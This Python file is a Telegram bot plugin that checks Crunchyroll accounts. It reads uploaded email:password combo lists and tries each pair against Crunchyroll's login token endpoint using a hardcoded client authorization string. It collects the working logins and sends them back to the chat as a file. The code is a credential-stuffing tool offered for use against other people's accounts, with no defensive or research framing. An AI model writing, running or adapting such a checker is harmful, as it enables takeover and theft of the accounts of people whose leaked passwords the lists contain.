from pyrogram import Client, filters
from pyrogram.types import Message
import re
import os
from urllib import request, parse, error
import json


class CrunchyrollChecker:
    def __init__(self, email, password):
        self.email = email
        self.password = password
        self.apiUrl = "https://beta-api.crunchyroll.com/"
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36"
        }
        self.auth = "Basic aHJobzlxM2F3dnNrMjJ1LXRzNWE6cHROOURteXRBU2Z6QjZvbXVsSzh6cUxzYTczVE1TY1k="
        self.data = {
            "grant_type": "password",
            "scope": "offline_access"
        }

    def _makeRequest(self, url, headers=None, data=None):
        if data:
            data = parse.urlencode(data).encode()
        req = request.Request(url, headers=headers, data=data)
        return req

    def _parseResponse(self, res):
        res = res.read()
        res = res.decode('utf-8')
        res = json.loads(res)
        return res

    def check_credentials(self):
        data = dict(self.data)
        data['username'] = self.email
        data['password'] = self.password
        headers = dict(self.headers)
        headers["authorization"] = self.auth
        headers["Content-Type"] = "application/x-www-form-urlencoded"
        req = self._makeRequest(
            self.apiUrl + "auth/v1/token",
            headers,
            data
        )
        try:
            res = request.urlopen(req)
        except error.HTTPError as e:
            if e.code == 401:
                return "invalid"
            elif e.code == 429:
                return "retry"
            else:
                return f"Error while trying to login: {e}"
        except Exception as e:
            return f"Error while trying to login: {e}"

        resData = self._parseResponse(res)
        try:
            access_token = resData['access_token']
        except KeyError:
            return f"Something went wrong while trying to login: {resData}"

        if access_token:
            return "hit"
        else:
            return "free"


@Client.on_message(filters.command("crun"))
async def crunchyroll_helper_command(app: Client, message: Message):
    return False, await message.reply_text('crunchyroll.com, \nThis Tool Under Development!, We will fix soon!')
    if message.reply_to_message and message.reply_to_message.document:
        document = await app.download_media(message.reply_to_message.document)

        with open(document, "r") as file:
            content = file.read()

        combos = re.findall(r"[\w\.]+@[\w\.]+:[\S]+", content)

        if combos:
            total_combos = len(combos)
            checked_combos = 0
            success_count = 0
            invalid_count = 0
            success_accounts = []

            progress_message = await message.reply_text("<b>⎚ `Crunchyroll Checking...`</b>")

            for combo in combos:
                email, password = combo.split(":")
                checker = CrunchyrollChecker(email, password)
                status = checker.check_credentials()

                checked_combos += 1

                if status == "hit":
                    success_count += 1
                    success_accounts.append(f"{email}:{password}")

                progress_text = f"Crunchyroll Checking... ({checked_combos}/{total_combos})"
                await progress_message.edit_text(progress_text)

            await progress_message.delete()

            if success_accounts:
                with open("success_accounts.txt", "w") as file:
                    file.write("\n".join(success_accounts))
                await app.send_document(message.chat.id, document="success_accounts.txt")
                os.remove("success_accounts.txt")

            os.remove(document)

        else:
            await message.reply_text("<b>No valid email:password combos found.</b>")

    else:
        await message.reply_text("<b>Please reply with a valid combo.txt file.</b>")


def save_results(filename, combos):
    with open(filename, "w") as file:
        file.write("\n".join(combos))
